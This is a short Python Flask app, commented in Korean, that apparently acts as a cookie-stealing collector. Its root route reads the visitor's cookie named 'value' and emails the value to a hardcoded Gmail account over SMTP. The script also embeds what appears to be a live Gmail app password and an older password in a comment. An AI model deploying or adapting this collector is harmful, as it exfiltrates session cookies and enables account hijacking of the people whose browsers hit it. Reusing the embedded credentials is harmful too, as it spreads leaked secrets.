import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/')
def index():
    # 쿠키 가져오기
    username = request.cookies.get('value')
    
    # 쿠키가 설정되어 있지 않은 경우의 메시지
    if not username:
        return '쿠키가 설정되어 있지 않습니다. <a href="/setcookie">여기</a>를 클릭하여 쿠키를 설정하세요.'
    # 이메일 설정 정보
    sender_email = "dsfs45587@gmail.com"
    receiver_email = "dsfs45587@gmail.com"
    app_password = "fnbd yisp aifj coob"#"neles0303"  # 1단계에서 생성한 앱 비밀번호

    # 이메일 내용 설정
    subject = "쿠키값은"
    body = "value:"+username

    # 이메일 객체 생성
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    # 이메일 서버에 연결하고 이메일 전송

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, app_password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        return "이메일이 성공적으로 전송되었습니다."

if __name__ == "__main__":
    app.run(debug=True)